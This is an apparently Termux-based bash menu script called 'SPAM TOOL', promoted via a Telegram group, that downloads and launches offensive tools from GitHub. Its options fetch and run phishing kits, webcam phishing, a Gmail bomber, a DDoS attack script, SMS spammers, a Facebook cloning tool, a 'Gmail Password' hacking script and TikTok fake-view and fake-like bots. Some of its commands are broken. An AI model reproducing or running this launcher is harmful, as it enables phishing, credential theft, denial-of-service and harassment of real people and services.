clear
mkdir ToolHacking
clear 
echo -e '\033[31;38;1m 
  \033[1;34m╔═════════════════════════════════════════════╗
  \033[1;32m      ████████╗░█████╗░░█████╗░██╗░░░░░ 
  \033[1;33m      ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░ 
  \033[1;34m      ░░░██║░░░██║░░██║██║░░██║██║░░░░░ 
  \033[1;35m      ░░░██║░░░██║░░██║██║░░██║██║░░░░░ 
  \033[1;36m      ░░░██║░░░╚█████╔╝╚█████╔╝███████╗ 
  \033[1;37m      ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝ 
               \033[6;36mVersion 1.4
     ➩ By Master TG By DONE 
     ➩ Join => Group:@ShareToolBuffViewTikTok
       \033[1;33mVersion:\033[0m 1.4  \033[1;36mCTRL+C:\033[31;38;1m exit
  \033[1;34m╚═════════════════════════════════════════════╝
\033[1;36m    ┏━━━━━━━━━━━━━━━━┓
       SPAM TOOL V1
    ┗━━━━━━━━━━━━━━━━┛
 \033[1;34m[1]\e[35m Requirements & Update
 \033[1;34m[2]\e[35m Phishing Tool				
 \033[1;34m[3]\e[35m WebCam Hack
 \033[1;34m[4]\e[35m User Find				
 \033[1;34m[5]\e[35m Gmail Bombs 
\033[1;36m    ┏━━━━━━━━━━━━━━━━┓
       SPAM TOOL V2
    ┗━━━━━━━━━━━━━━━━┛  
 \033[1;34m[6]\e[35m DDOS Attack  
 \033[1;34m[7]\e[35m How to use ?
 \033[1;34m[8]\e[35m Uninstall Downloaded Programs 		
 \033[1;34m[9]\e[35m TIKTOK-BOT \e[31m Update
 \033[1;34m[10]\e[35m SPAM SMS V1 \e[31m Update 
\033[1;36m    ┏━━━━━━━━━━━━━━━━┓
       SPAM TOOL V3
    ┗━━━━━━━━━━━━━━━━┛  
 \033[1;34m[11]\e[35m SPAM SMS V2 \033[1;32m Update New
 \033[1;34m[12]\e[35m CCV-CAMERA-V1 \033[1;32m Update New
 \033[1;34m[13]\e[35m IPDRONE \e[31m Update 
 \033[1;34m[14]\e[35m TIKTOK VIEW V1 \033[1;32m Update New 
 \033[1;34m[15]\e[35m FB CLONE TOOL \e[31m Update 
 \033[1;36m   ┏━━━━━━━━━━━━━━━━┓
       SPAM TOOL V4
    ┗━━━━━━━━━━━━━━━━┛
 \033[1;34m[16]\e[35m TIKTOK LIKE BOT V1 \033[1;32m Update New  
 \033[1;34m[17]\e[35m TIKTOK VIEW BOT V2 \033[1;32m New 
 \033[1;34m[18]\e[35m GMAIL PASSWORD \033[1;32m New 
 \033[1;34m[19]\e[35m FB SHARE V1 \033[1;32m Update New 
'


#Menu Coding


read -p " Enter number: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

## Requirements 
echo -e "\033[47;31;5m Updating and Installing Requirements...\033[0m"
sleep 5
pkg install git -y
pkg install python python2 -y
pkg install pip pip2 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Update Completed...\033[0m"
sleep 3
bash tga1.sh


## Phishing Tool
elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools2
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

## Webcam Hack
elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools3
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh


## Finduser
elif [[ $islem == 4 || $islem == 04 ]]; then
clear 
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools4
git clone https://github.com/xHak9x/finduser
cd finduser
bash finduser.sh
       

## Gmail Bomber
elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools5
git clone https://github.com/palahsu/MBomb.git
cd MBomb
cd 'MBomb v2'
pip install colorama 
pip install tqdm
python MBomb.py

## DDOS Attack
elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[47;3;35m Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tools6
pip3 install requests pysocksUninstall Programs
git clone https://github.com/Leeon123/CC-attack
cd CC-attack
python3 cc.py


## How to use
elif [[ $islem == 7 || $islem == 07 ]]; then
clear
xdg-open https://pasteio.com/xuCvIkXdNRIB
bash tga.sh

## 
elif [[ $islem == 8 ]]; then
        clear

echo -e "\033[47;3;35m DOWNLOADED PROGRAMS ARE BEING REMOVED...\033[0m"
sleep 3 
rm -rf Tools

bash tga.sh

## TIKTOK-BOT
elif [[ $islem == 9|| $islem == 09 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
cd Tool9
git clone https://github.com/mastertgtool/TIKTOK-BOT.git
cd TIKTOK-BOT
pip install -r requirements.txt
python bot.py

## SPAM SMS V1
elif [[ $islem == 10|| $islem == 10 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
git clone https://github.com/mastertgtool/SPAM-SMS-V1.git
cd SPAM-SMS-V1
bash set.sh

## SPAM SMS V2
elif [[ $islem == 11|| $islem == 11 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
git clone https://github.com/mastertgtool/SPAM-SMS-V2.git
cd SPAM-SMS-V2
clear
python SPAM-SMS-V2.py

## CCV-CAMERA-V1
elif [[ $islem == 12|| $islem == 12 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
git clone https://github.com/mastertgtool/CCV-CAMERA-V1.git
cd CCV-CAMERA-V1
clear
python CCV-CAMERA-V1.py

## IPDRONE
elif [[ $islem == 13|| $islem == 13 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
pkg install git
git clone https://github.com/mastertgtool/IPDRONE.git
cd ipdrone
python ipdrone.py -v 101.7114774

## TIKTOK VIEW
elif [[ $islem == 14|| $islem == 14 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
pkg install python
pkg install git
git clone https://github.com/mastertgtool/TIKTOKVIEWV1.git
cd TIKTOKVIEWV1
python view.py

## FB CLONE V1
elif [[ $islem == 15|| $islem == 15 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
apt update 
apt upgrade
apt install python
pip install beautifulsoup4
pkg install git
git clone https://github.com/mastertgtool/FB-CLONE-TOOL.git
cd FB-CLONE-TOOL
python fbclone.py

## TikTok Likes
elif [[ $islem == 16|| $islem == 16 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
git clone https://github.com/mastertgtool/TikTokLike-.git
cd TikTokLike-
python TikTok.py

## TIKTOK VIEW V2
elif [[ $islem == 17|| $islem == 17 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
git clone https://github.com/mastertgtool/TIKTOKVIEW.git
cd TIKTOKVIEW
python viewtik_enc.py

## GMAIL PASSWORD
elif [[ $islem == 18|| $islem == 18 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
termux-setup-storage
apt full-upgrade
apt install git
git clone https://github.com/mastertgtool/Gmail-Password.git
cd Gmail-Password
bash install.sh
python3 Mail-Hack.py

## FB AOTO SHARE V1
elif [[ $islem == 19|| $islem == 19 ]]; then
clear
echo -e "\033[47;3;35m  Installation May Take a Long Time Wait\033[0m"
sleep 3
https://github.com/mastertgtool/AOTO_FB_SHARE.git
pip install -r key.txt
cd AOTO_FB_SHARE
python AOTO_SHARE.py

## Faulty code

else   
	clear
        echo -e '\033[36;40;1m You Entered Incorrect Code'	
	sleep 1
	clear 
	bash tga1.sh
fi
    